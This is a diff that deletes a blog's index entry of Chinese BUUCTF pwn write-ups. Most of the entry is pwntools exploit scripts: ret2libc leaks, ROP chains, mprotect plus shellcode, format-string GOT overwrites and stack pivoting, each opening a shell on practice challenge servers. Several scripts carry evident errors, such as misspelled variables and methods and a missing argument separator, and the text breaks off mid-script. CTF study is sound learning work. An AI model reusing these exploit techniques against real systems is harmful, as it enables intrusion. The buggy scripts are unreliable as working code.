@@ -206,499 +206,7 @@
       </tags>
   </entry>
   <entry>
-    <title>BUU平台的Pwn题记录</title>
-    <url>/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/</url>
-    <content><![CDATA[<h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><h4 id="64位泄露ret2libc"><a href="#64位泄露ret2libc" class="headerlink" title="-&gt;64位泄露ret2libc"></a>-&gt;64位泄露ret2libc</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 思路：利用ret2libc泄露地址，从而达到system(&quot;bin/sh&quot;)</span></span><br><span class="line"><span class="comment"># 0x0000000000400c83 : pop rdi ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004006b9 : ret</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25216</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi_ret_addr = <span class="number">0x400c83</span></span><br><span class="line">ret_addr = <span class="number">0x4006b9</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># r.recvuntil(b&#x27;Input your choice!\n&#x27;,True)</span></span><br><span class="line"><span class="comment"># r.sendline(b&#x27;1&#x27;)</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice!\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\0&#x27;</span> + cyclic(<span class="number">0x50</span> + <span class="number">0x08</span> - <span class="number">0x01</span>) + p64(rdi_ret_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;encrypted\n&#x27;</span>, payload)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>)) <span class="comment"># 不满足8位的用0补齐</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr) <span class="comment"># 利用LibcSearcher模块找到libc的版本 [libc6_2.27-3ubuntu1_amd64]</span></span><br><span class="line">offest = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>) <span class="comment"># 算偏移量</span></span><br><span class="line">binsh = offest + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) <span class="comment"># 任一函数地址 = 偏移量 + libc中对应函数的地址</span></span><br><span class="line">system = offest + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice!\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;\0&#x27;</span> + cyclic(<span class="number">0x50</span> + <span class="number">0x08</span> - <span class="number">0x01</span>) + p64(ret_addr) + p64(rdi_ret_addr) + p64(binsh) + p64(system)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;encrypted\n&#x27;</span>, payload1)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><h4 id="32位-ret2libc"><a href="#32位-ret2libc" class="headerlink" title="-&gt;32位 ret2libc"></a>-&gt;32位 ret2libc</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">![libc](BUU%E5%<span class="number">88</span>%B7%E9%A2%<span class="number">98</span>/libc.png)<span class="comment"># Libc泄露：通过什么函数来泄露？ 找到这个函数之后，elf.got elf.plt , </span></span><br><span class="line"><span class="comment"># Libc泄露：通过write函数来泄露。</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29598</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./2018_rop&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x88</span> + <span class="number">0x04</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">0</span>) + p32(write_pot) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line"></span><br><span class="line">offest = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = offest + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = offest + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = cyclic(<span class="number">0x88</span> + <span class="number">0x04</span>) + p32(system_addr) + p32(<span class="number">0</span>) + p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#选择 libc6-i386_2.27-3ubuntu1_amd64 这个libc版本</span></span><br></pre></td></tr></table></figure></div>
-
-
-
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/libcsearch.png"></p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/libc.png"></p>
-<p>泄露出来一个函数的真实地址后，去那个网站搜索一下 对应的版本 </p>
-<p>-&gt; 如果只泄露出来一个函数，可能对应有很多个版本，可以泄露多个函数缩小范围（因为有多个版本时，需要一个一个试）</p>
-<p>-&gt; 下面这个图应该就是对应 offest的解释吧（看别人的Wp之后的理解）</p>
-<p>我们此时应该已知 &#x3D;&gt; write函数真实地址 知道了两个write_offest system_offest</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">system_real_addr = write_real_addr + system_offest - write_offest</span><br><span class="line">bin_sh_real_addr = write_real_addr + str_bin_sh_offest - write_offest</span><br></pre></td></tr></table></figure></div>
-
-
-
-<h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><p>checksec一下：</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/01.png"></p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/00.png"></p>
-<p>可知将var[13]赋值一个17(0x11)就可以得到shell</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28656</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_n_8&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span>*<span class="number">13</span> + p32(<span class="number">0x11</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
-
-<p>但是这个payload并没有打通。</p>
-<p><strong>这里有个知识点:</strong></p>
-<blockquote>
-<p>qword全称是Quad Word。2个字节就是1个Word（1个字，16位），q就是英文quad-这个词根（意思是4）的首字母，所以它自然是word（2字节，0~2^16-1）的四倍，8字节</p>
-</blockquote>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28656</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_n_8&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span>*<span class="number">13</span> + p64(<span class="number">0x11</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
-
-
-
-<h2 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h2><h3 id="学习：32位和64位传参的区别"><a href="#学习：32位和64位传参的区别" class="headerlink" title="学习：32位和64位传参的区别"></a>学习：32位和64位传参的区别</h3><p><strong>32位：</strong>直接将参数放在栈中</p>
-<p><strong>64位：</strong>前六个参数放在寄存器中（rdi rsi rdx rcx r8 r9），如果还有参数，那再依次放入栈中</p>
-<h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a><strong>题解：</strong></h3><p>这个题是64位程序，在ida中打开，发现有栈溢出漏洞（vulnerable_function函数中）</p>
-<p><code>Shift + F12</code> 可以看到有<code>system</code>函数和 <code>/bin/sh</code>字符串</p>
-<p>-&gt; 先覆盖buf和rbp</p>
-<p>-&gt; 然后是 pop rdi ret &#x3D;&gt; 将栈顶元素（binsh字符串的地址）弹入rdi寄存器中，并且返回到下一指令处</p>
-<p>-&gt; 然后是返回到system()的地址</p>
-<p>-&gt; 参数就是rdi寄存器中的 binsh字符串</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 0x00000000004006b3 : pop rdi ; ret</span></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span><span class="number">26999</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level2_x64&#x27;</span>)</span><br><span class="line">bin_sh_addr = <span class="number">0x600A90</span></span><br><span class="line">system_addr = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">rdi_ret_addr = <span class="number">0x4006b3</span></span><br><span class="line">payload = cyclic(<span class="number">0x80</span> + <span class="number">0x08</span>) + p64(rdi_ret_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
-
-<blockquote>
-<p>rdi的地址这样找：</p>
-<p><code>ROPgadget --binary level2_x64 --only &#39;pop|ret&#39;</code></p>
-</blockquote>
-<h2 id="not-the-same-3dsctf-2016-静态-32位"><a href="#not-the-same-3dsctf-2016-静态-32位" class="headerlink" title="not_the_same_3dsctf_2016[静态 32位]"></a>not_the_same_3dsctf_2016[静态 32位]</h2><p><code>ctrl + x</code> 查看调用字符串的位置</p>
-<p><code>ctrl + s</code>调出程序的段表，</p>
-<p><code>mprotect(void *addr, size_t len, int prot)函数</code></p>
-<p>-&gt; addr 内存启始地址；len 修改内存的长度；prot 内存的权限</p>
-<p>-&gt; 将.got.plt段改写为可读可写可执行的</p>
-<p><strong>肯定有人疑问了为什么是0x80EB000而不是bss段的开头0x80EBF80，因为指定的内存区间必须包含整个内存页（4K），起始地址 start 必须是一个内存页的起始地址，并且区间长度 len 必须是页大小的整数倍</strong></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25763</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line">read_addr=elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">mprotect=<span class="number">0x806ED40</span></span><br><span class="line">addr=<span class="number">0x80eb000</span></span><br><span class="line">p3_ret=<span class="number">0x806fcc8</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload  =<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(mprotect)+p32(p3_ret)</span><br><span class="line">payload +=p32(addr)+p32(<span class="number">0x100</span>)+p32(<span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line">payload +=p32(read_addr)+p32(p3_ret)</span><br><span class="line"></span><br><span class="line">payload +=p32(<span class="number">0</span>)+p32(addr)+p32(<span class="built_in">len</span>(shellcode))+p32(addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-
-
-<h2 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h2><p>checksec一下 32位 有NX保护（栈不可执行），canary保护（会放入一个值，在返回的时候会进行检查，得保证这个值没变）</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/02.png"></p>
-<p>偏移量的计算 10 &#x3D;&gt; 我们输入的数据是从第十个开始的</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/03.png"></p>
-<p>A的ascii值是65 &#x3D;&gt; 对应十六进制的0x41             a的ascii值是97 &#x3D;&gt; 对应十六进制的0x61</p>
-<p>程序要求我们输入的值与随机数相等，才可以执行<code>system(&#39;bin/sh&#39;)</code></p>
-<p>&#x3D;&gt; 由于存在格式化字符串漏洞</p>
-<p>我们可以通过<code>%n</code> 来修改储存随机数的地址的值</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/04.png"></p>
-<p>随机数起始地址是在 0x804c044 由于随机数是四位 </p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26680</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">payload = p32(<span class="number">0x804c044</span>) + p32(<span class="number">0x804c045</span>) + p32(<span class="number">0x804c046</span>) + p32(<span class="number">0x804c047</span>)</span><br><span class="line">payload += <span class="string">&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">0x10101010</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
-
-
-
-<p>给Bss赋值，使得NX不可执行变为可执行 &#x3D;&gt; 构建shellcode</p>
-<div class="highlight-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="code"><pre><span class="line">int mprotect(const void <span class="emphasis">*start, size_t len, int prot);</span></span><br><span class="line"><span class="emphasis">	第一个参数填的是一个地址，是指需要进行操作的地址。</span></span><br><span class="line"><span class="emphasis">	第二个参数是地址往后多大的长度。</span></span><br><span class="line"><span class="emphasis">	第三个参数的是要赋予的权限。</span></span><br><span class="line"><span class="emphasis">mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</span></span><br><span class="line"><span class="emphasis">prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</span></span><br><span class="line"><span class="emphasis">　　1）PROT_READ：表示内存段内的内容可写；</span></span><br><span class="line"><span class="emphasis">　　2）PROT_WRITE：表示内存段内的内容可读；</span></span><br><span class="line"><span class="emphasis">　　3）PROT_EXEC：表示内存段中的内容可执行；</span></span><br><span class="line"><span class="emphasis">　　4）PROT_NONE：表示内存段中的内容根本没法访问。</span></span><br><span class="line"><span class="emphasis">prot=7表示可读可写可执行，将它类比于chmod中的7</span></span><br></pre></td></tr></table></figure></div>
-
-
-
-<h2 id="HDCTF-2023-KEEP-ON"><a href="#HDCTF-2023-KEEP-ON" class="headerlink" title="[HDCTF 2023]KEEP ON"></a>[HDCTF 2023]KEEP ON</h2><h3 id="知识点：格式化字符串劫持、栈迁移"><a href="#知识点：格式化字符串劫持、栈迁移" class="headerlink" title="知识点：格式化字符串劫持、栈迁移"></a><strong>知识点：格式化字符串劫持、<a class="link" href="https://www.cnblogs.com/max1z/p/15299000.html">栈迁移 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong></h3><p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/10.png"></p>
-<h3 id="法1-格式化字符串劫持-将printf-got-改成-system-plt"><a href="#法1-格式化字符串劫持-将printf-got-改成-system-plt" class="headerlink" title="法1,格式化字符串劫持(将printf_got 改成 system_plt)"></a><strong>法1,格式化字符串劫持(将printf_got 改成 system_plt)</strong></h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#   -&gt; 通过调用printf函数来调用system函数的地址，而这个程序中我们写入的内容保存在s中 然后会作为printf的参数，从而得到shell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level=&quot;debug&quot;,arch=&quot;i386&quot;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28014</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./../pwn&quot;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./hdctf&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]  <span class="comment"># 寻找got表中printf的地址</span></span><br><span class="line"></span><br><span class="line">system_glt = elf.glt[<span class="string">&#x27;system&#x27;</span>]  <span class="comment"># 寻找plt表中system的地址</span></span><br><span class="line"></span><br><span class="line">payload1 = fmtstr_payload(<span class="number">6</span>, &#123;printf_got:system_plt&#125;)  <span class="comment"># fmtstr_payload:got表劫持函数, 6是对应格式化字符串位置的索引，后面将printf的地址改成system的</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)   <span class="comment"># \n 是换行的意思.</span></span><br><span class="line"></span><br><span class="line">p.send(payload1)	<span class="comment"># 这里发送是为了将printf_got 改成 system_plt =&gt; 以后调用printf函数就相当于调用system</span></span><br><span class="line"></span><br><span class="line">vulnaddr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload2 = cyclic(<span class="number">0x50</span> + <span class="number">0x08</span>) + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;keep on !\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload2)   <span class="comment"># 这里必须用send --&gt; 因为这里的read写入0x60(溢出16字节)0x08和vuln的地址就是16字节了,sendline后面跟有换行符</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<blockquote>
-<p>寻找偏移量 找 616161在第几位 </p>
-<p>​	-&gt; 我们输入的是aaaa 0x61(十六进制 -&gt; ascii的97)即a</p>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/11.png"></p>
-<h3 id="法2-栈迁移-可以先阅读前面的那个文章"><a href="#法2-栈迁移-可以先阅读前面的那个文章" class="headerlink" title="法2,栈迁移,可以先阅读前面的那个文章"></a>法2,栈迁移,可以先阅读前面的那个文章</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ROPgadget --binary hdctf --only &quot;pop|ret&quot;  0x00000000004008d3 : pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget --binary hdctf | grep leave   0x00000000004007f2 : leave ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28296</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./hdctf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;%16$p&#x27;</span>)  <span class="comment"># 获得 old_rbp</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;hello,0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">old_rbp = <span class="built_in">int</span>(io.recvunitl(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target_addr = old_rbp - <span class="number">0x60</span> - <span class="number">0x08</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008d3</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x4007f2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi_ret) + p64(target_addr + <span class="number">0x20</span>) + p64(elf.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(target_addr) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;keep on !&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
-
-<p>Q&amp;A（个人理解）</p>
-<p><code>%16$p是哪来的</code></p>
-<p>-&gt;可以用过gdb动态调试得到old_rbp的具体值,然后通过尽量多的%p来泄露出具体位置</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/12.png"></p>
-<p><code>0x60是哪里来的?</code></p>
-<p>-&gt;子函数中栈底指向了父函数的栈底的地址, 0x7fffffffe1e0就是old_rbp - 0x7fffffffe180&#x3D;0x60</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/13.png"></p>
-<p><code>payload中为什么要加0x20 ?</code></p>
-<p>-&gt; 0x20 &#x3D; 32 &#x3D;&gt; 4个8字节, 指向了&#x2F;bin&#x2F;sh所在的位置</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/14.png"></p>
-<h2 id="BUU-HNCTF-2022-Week1-fmtstrre"><a href="#BUU-HNCTF-2022-Week1-fmtstrre" class="headerlink" title="BUU-[HNCTF 2022 Week1]fmtstrre"></a>BUU-[HNCTF 2022 Week1]fmtstrre</h2><p>先checksec一下</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/06.png"></p>
-<p>然后IDA(64)打开</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/09.png"></p>
-<blockquote>
-<p>open函数(成功打开文件返回非负整数，打开失败返回-1)</p>
-<p>read(fd, &amp;name, 48uLL)函数(向fd中读取48字节数据存放至name地址下)</p>
-<p>将name的地址赋值给v5</p>
-<p>再向buf中写入256字节数据</p>
-</blockquote>
-<p>格式化字符串漏洞点 <code>printf(buf)</code></p>
-<p><code>这段代码中需要打开flag这个文件 =l&gt; 小技巧</code></p>
-<p>-&gt; 在当前目录下创建一个flag文件，并输入一些东西，可以帮助我们观察其在栈上的位置。</p>
-<p>-&gt;当然,这个文件不是必须的.</p>
-<p><code>该如何利用这个漏洞？</code>根据这个题，flag这个文件的内容是存放在了栈中，那我们就要知道具体的位置。</p>
-<p>-&gt;偏移量的计算（看别人的Wp说是偏移了38）即flag 的内容是保存在第38个的位置上的</p>
-<p><strong>参考<a class="link" href="https://www.cnblogs.com/falling-dusk/p/17858030.html">https://www.cnblogs.com/falling-dusk/p/17858030.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong></p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/07.png"></p>
-<blockquote>
-<p>找 …4141… 类似的数据，看它是第几个地址（6）</p>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/08.png"></p>
-<blockquote>
-<p>name即flag的位置，0x20 &#x3D;32 &#x3D;&gt;偏移量.</p>
-<p>rsp到name的距离是 0x1d0 - 0x0d0 &#x3D; 256 &#x2F; 8 &#x3D;32</p>
-<p>​	对于这里要除以8 —&gt; 我理解的是（64位程序，栈中一个小格格是8字节数据，一共相差256字节，即32个小格子）</p>
-</blockquote>
-<p>32 + 6 &#x3D;38</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a><strong>exp:</strong></h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote()</span><br><span class="line">payload = <span class="string">&quot;%38$s&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
-
-
-
-<h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p><code>open(&quot;/dev/urandom&quot;, 0);</code></p>
-<p>-&gt; <code>/dev/urandom</code>这个文件是产生随机数的</p>
-<p>-&gt; 0 是表示以只读模式打开</p>
-<p>-&gt; 如果open调用成功，返回一个非负整数 ； 如果调用失败，返回-1</p>
-<p><code>read(0, buf, 32u);</code></p>
-<p>-&gt; 从 0（标准输入[键盘]）中读取32字节数据 存放在buf中</p>
-<p>-&gt; 如果成功读取，返回实际读取的字节数</p>
-<p>-&gt; 如果未成功读取，返回-1，并设置全局变量errno来指示错误原因</p>
-<p><code>strncmp(buf, s, v1) </code></p>
-<p>-&gt;用于比较前两个字符串[buf s]的 前v1 个字符</p>
-<p>-&gt;如果前v1个字符都相同，返回0 ； 如果不同，则返回第一个不匹配的字符的ASCII码差值</p>
-<p><strong>找不到system和binsh，很明显要通过构造Rop寻找libc</strong></p>
-<p>题目提供了libc文件</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27244</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span 